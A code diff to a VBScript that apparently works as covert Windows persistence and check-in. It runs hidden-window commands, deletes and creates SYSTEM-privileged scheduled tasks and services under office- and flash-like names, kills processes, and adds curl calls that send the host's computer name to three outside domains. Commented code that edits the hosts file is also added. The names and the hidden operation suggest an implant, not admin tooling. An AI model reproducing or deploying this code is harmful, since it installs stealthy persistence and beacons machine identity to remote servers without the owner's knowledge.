@@ -4,8 +4,8 @@ strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
 With CreateObject("WScript.Shell")
      
     ' Pass 0 as the second parameter to hide the window...
-    '.Run "schtasks /delete /tn office_get /F", 0, True
-    '.Run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F", 0, True
+    .Run "schtasks /delete /tn office_get /F", 0, True
+    .Run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F", 0, True
     .Run "taskkill /f /im sys2.exe", 0, True
     '.Run "schtasks /delete /tn flash_fw /F", 0, True
     .Run "sc delete CppWindowsService", 0, True
@@ -16,9 +16,9 @@ With CreateObject("WScript.Shell")
     'cmd="net start CppWindowsService" 
     'user="SYSTEM"
     .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
-    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys1.dll"" /tn flash_fw /rl highest /F", 0, True
+    '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr ""rundll32 " & windir & "\sys3.dll sysfunc"" /tn flash_fw /rl highest /F", 0, True
     '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 1 /tr """ & windir & "\WindowsTask.exe"" /tn pippo /rl highest /F", 0, True
-    '.Run windir & "\test.pdf"
+    '.Run windir & "\file.pdf"
     
     '.Run "schtasks /create /tn flash_fw /xml " & windir & "\flash_fw.xml /F", 0, True
 End With
@@ -38,5 +38,19 @@ for each nad in colAdapters
         'mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
       end if
     end if  
-next 
-oShell.Run "curl http://paner.altervista.org/svc/wup.php?pc=mttool_" & strComputerName
+next
+'Set oFSO = CreateObject("Scripting.FileSystemObject")
+'Set oHosts = oFSO.GetFile("C:\Windows\System32\drivers\etc\hosts")
+''WScript.Echo oHosts.attributes
+'Set fileAPPEND = _
+'  oFSO.OpenTextFile("C:\Windows\System32\drivers\etc\hosts", 8, true)
+'fileAPPEND.Write(vbNewLine & "104.28.20.191 paner.altervista.org")
+'fileAPPEND.Close()
+'Set fileAPPEND = Nothing
+'Set oHosts = Nothing
+'Set oFSO = Nothing
+'WScript.Echo "type " & windir & "\system32\drivers\etc\hosts | find /i paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
+'oShell.Run "type " & windir & "\system32\drivers\etc\hosts | findstr paner.altervista.org || echo 10.0.0.0 paner.altervista.org >> " & windir & "\system32\drivers\etc\hosts"
+oShell.Run "curl https://paner.altervista.org/svc/wup.php?pc=mttool_" & strComputerName
+oShell.Run "curl http://troglo.homepc.it/svc/wup.php?pc=mttool_" & strComputerName
+oShell.Run "curl https://ctpescara.it/svc/wup.php?pc=mttool_" & strComputerName
